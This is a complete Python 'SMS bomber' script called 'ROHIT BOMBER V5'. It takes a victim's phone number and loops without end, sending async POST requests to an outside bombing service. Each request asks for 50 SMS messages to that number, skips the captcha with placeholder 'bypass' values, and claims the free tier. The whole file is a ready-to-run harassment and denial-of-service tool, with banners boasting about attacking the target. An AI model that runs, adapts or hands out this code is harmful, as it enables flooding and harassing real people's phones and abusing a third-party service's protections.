import asyncio
import aiohttp
import json
import os
import sys
import time

API_URL = "https://api.callbomberpro.shop/api/bomber/mix"

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Linux; Android 15; RMX3782 Build/AP3A.240617.008; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/150.0.7871.183 Mobile Safari/537.36",
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "application/json",
    "origin": "https://callbomberpro.shop",
    "referer": "https://callbomberpro.shop/",
}

G = '\033[92m'
Y = '\033[93m'
R = '\033[91m'
W = '\033[97m'
B = '\033[1m'
X = '\033[0m'

stats = {"total": 0, "success": 0, "sms": 0, "start": 0}


async def fire(session, phone):
    payload = {
        "phone": str(phone),
        "amount": 50,
        "captchaId": "login-only-bypass",
        "userInput": "login-only-bypass",
        "mode": "free",
        "isPaid": False
    }
    try:
        async with session.post(API_URL, data=json.dumps(payload),
                                headers=HEADERS, timeout=aiohttp.ClientTimeout(total=8)) as r:
            stats["total"] += 1
            if r.status == 200:
                stats["success"] += 1
                stats["sms"] += 50
                return True
            return False
    except:
        stats["total"] += 1
        return False


async def attack(phone):
    stats["start"] = time.time()
    cycle = 0
    connector = aiohttp.TCPConnector(limit=20, ssl=False)

    async with aiohttp.ClientSession(connector=connector) as session:
        while True:
            cycle += 1
            tasks = [fire(session, phone) for _ in range(5)]
            await asyncio.gather(*tasks, return_exceptions=True)

            elapsed = max(1, int(time.time() - stats["start"]))
            rate = stats["total"] / elapsed
            bar_pos = cycle % 24
            bar = "█" * bar_pos + "░" + "█" * (23 - bar_pos)

            sys.stdout.write(
                f"\r{G}⚡ [{bar}]{X} "
                f"{G}Req:{X}{stats['total']} "
                f"{G}OK:{X}{stats['success']} "
                f"{G}SMS:{X}{stats['sms']} "
                f"{Y}{rate:.0f}/s{X} "
                f"{Y}{elapsed}s{X}  "
            )
            sys.stdout.flush()

            await asyncio.sleep(0.2)


async def main():
    os.system('clear')
    print(f"""{G}{B}
╔════════════════════════════════════════════╗
║                                            ║
║         ██████╗  ██████╗ ██╗  ██╗          ║
║         ██╔══██╗██╔═══██╗██║  ██║          ║
║         ██████╔╝██║   ██║███████║          ║
║         ██╔══██╗██║   ██║██╔══██║          ║
║         ██║  ██║╚██████╔╝██║  ██║          ║
║         ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝          ║
║                                            ║
║           ROHIT BOMBER  V5                 ║
║                                            ║
╚════════════════════════════════════════════╝{X}
""")

    phone = input(f"{G}➜ NUMBER DAALO : {X}").strip()
    phone = ''.join(filter(str.isdigit, phone))

    if len(phone) < 10:
        print(f"\n{R}❌ Galat number!{X}\n")
        sys.exit(1)

    print(f"\n{G}{B}▶ START... {phone} KO FUCK KAR RAHE HAIN 🔥{X}")
    print(f"{Y}⛔ Rokne ke liye Ctrl+C dabao{X}\n")

    await asyncio.sleep(0.5)

    try:
        await attack(phone)
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        elapsed = max(1, int(time.time() - stats["start"])) if stats["start"] else 0
        print(f"\n\n{G}{'═' * 50}{X}")
        print(f"{G}{B}   ✅ STOPPED{X}")
        print(f"{G}{'═' * 50}{X}")
        print(f"{W}  Requests : {X}{stats['total']}")
        print(f"{G}  Success  : {X}{stats['success']}")
        print(f"{G}  SMS Sent : {X}{G}{B}{stats['sms']}{X}")
        print(f"{W}  Runtime  : {X}{elapsed}s")
        print(f"{G}{'═' * 50}{X}\n")
        sys.exit(0)